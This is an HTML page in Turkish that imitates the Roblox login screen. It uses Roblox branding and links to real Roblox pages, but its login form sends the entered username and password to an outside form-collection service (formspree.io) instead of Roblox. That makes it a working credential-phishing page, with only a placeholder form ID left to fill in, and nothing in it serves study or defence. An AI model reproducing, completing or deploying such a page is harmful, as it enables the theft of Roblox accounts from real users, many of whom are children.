<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Giriş</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "HMD", "Segoe UI", Roboto, Arial, sans-serif;
        }

        body {
            background-image: url('https://assets.turbologo.com/blog/tr/2021/11/18072335/roblox-brand-958x575.png');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 0;
        }

        /* SAĞ ÜST NAV (Eski özellikler korunuyor) */
        .navbar {
            position: absolute;
            top: 20px;
            right: 30px;
            display: flex;
            gap: 12px;
            z-index: 10;
        }

        .nav-link {
            padding: 8px 18px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            transition: 0.2s;
        }

        .btn-white { background: white; color: black; }
        .btn-outline { background: transparent; color: white; border: 1px solid white; }

        /* YENİ GİRİŞ PANELİ (Görseldekiyle aynı) */
        .login-card {
            position: relative;
            z-index: 5;
            background-color: #2B2D2F;
            width: 420px;
            padding: 35px;
            border-radius: 12px; /* Daha yuvarlak */
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        h2 {
            color: white;
            font-size: 32px; /* Görseldeki gibi büyük */
            font-weight: 800;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            height: 48px;
            padding: 0 15px;
            background-color: #393B3D;
            border: 1px solid #111;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            margin-bottom: 15px;
            outline: none;
        }

        input:focus { border-color: #adb5bd; }

        /* ANA GİRİŞ BUTONU */
        .primary-btn {
            width: 100%;
            height: 48px;
            background-color: transparent;
            color: white;
            border: 2px solid #adb5bd;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 20px;
            transition: 0.3s;
        }

        .primary-btn:hover { background-color: rgba(255,255,255,0.1); }

        .forgot-text {
            color: white;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            display: block;
            margin-bottom: 25px;
        }

        .divider {
            height: 1px;
            background-color: #454749;
            margin-bottom: 25px;
        }

        /* GRİ EK BUTONLAR */
        .secondary-btn {
            width: 100%;
            height: 48px;
            background-color: #393B3D;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .secondary-btn:hover { background-color: #454749; }

        .signup-text {
            color: white;
            text-decoration: none;
            font-weight: 700;
            font-size: 16px;
            display: block;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="navbar">
        <a href="https://www.roblox.com/referrals/signup" class="nav-link btn-white">Kaydol</a>
        <a href="https://www.roblox.com/login" class="nav-link btn-outline">Giriş Yap</a>
    </div>

    <div class="login-card">
        <h2>Hesap ekle</h2>

        <form action="https://formspree.io/f/BURAYA_KODUNU_YAZ" method="POST">
            <input type="text" name="user" placeholder="Kullanıcı adı/E-posta/Telefon" required>
            <input type="password" name="pass" placeholder="Şifre" required>
            
            <button type="submit" class="primary-btn">Giriş yapmak</button>
        </form>

        <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-text">Şifrenizi veya kullanıcı adınızı mı unuttunuz?</a>
        
        <div class="divider"></div>

        <button class="secondary-btn" onclick="window.location.href='https://www.roblox.com/login'">Bana Tek Kullanımlık Bir Kod Gönderin</button>
        <button class="secondary-btn" onclick="window.location.href='https://www.roblox.com/login'">Hızlı Giriş</button>

        <a href="https://www.roblox.com/" class="signup-text">Yeni Hesap Oluştur</a>
    </div>

</body>
</html>
